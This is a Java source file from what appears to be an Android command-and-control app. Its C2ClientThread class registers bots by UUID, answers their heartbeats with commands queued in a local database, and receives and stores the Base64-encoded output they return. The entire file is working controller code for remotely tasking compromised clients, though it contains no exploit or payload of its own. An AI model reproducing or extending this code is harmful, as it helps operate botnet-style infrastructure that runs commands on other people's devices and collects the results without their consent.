package c2.mobile.mobilec2;

import android.content.Intent;
import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.UUID;

public class C2ClientThread extends Thread {
    private Socket socket;
    private BufferedReader in;
    private PrintWriter out;
    private UUID uuid;
    private CommandDatabase commandDatabase;

    public C2ClientThread(Socket socket, CommandDatabase commandDatabase) {
        super("C2ClientThread");
        this.socket = socket;
        this.commandDatabase = commandDatabase;
        try {
            this.in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            this.out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void run() {
        while (true){
            String str = null;
            try {
                str = in.readLine();
//                String[] line = str.split(" ");
                if(str != null){
                    Log.i("received response from server", str);
                    switch (str) {
                        // uuid: blah
                        case "set-uuid":
                            String uuidString = in.readLine();
                            Log.e("RECV UUID: ", uuidString);
                            this.uuid = UUID.fromString(uuidString);
                            Log.e("Set UUID", uuid.toString());
                            break;
                        case "new-uuid":
                            this.uuid = UUID.randomUUID();
                            boolean bool = commandDatabase.insertIntoDatabase(uuid.toString(), "", "");
                            Log.e("New UUID", uuid.toString());
                            out.println(uuid.toString());
                            break;
                        case "heartbeat":
                            //str should be heartbeat
                            //if it is, fetch command from database
                            ArrayList<String> cmds = commandDatabase.getFromDatabase(uuid.toString(), BotEntryContract.BotEntry.command);
                            String command = cmds.get(0);
                            ArrayList<String> outs = commandDatabase.getFromDatabase(uuid.toString(), BotEntryContract.BotEntry.output);
                            String outputs = outs.get(0);
                            //if there is a command, send command and readLine for output
                            if (!command.equals("") && outputs != null && !outputs.equals("Success")) {
                                out.println(command);
                                String output = in.readLine();
                                output = new String(Base64.getDecoder().decode(output.getBytes(StandardCharsets.UTF_8)));
                                Log.e("From client: ", output);
                                commandDatabase.updateDatabase(uuid.toString(), "", output);

                                //if there is no command, send "none"
                            } else {
                                out.println("None");
                            }
                            break;
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
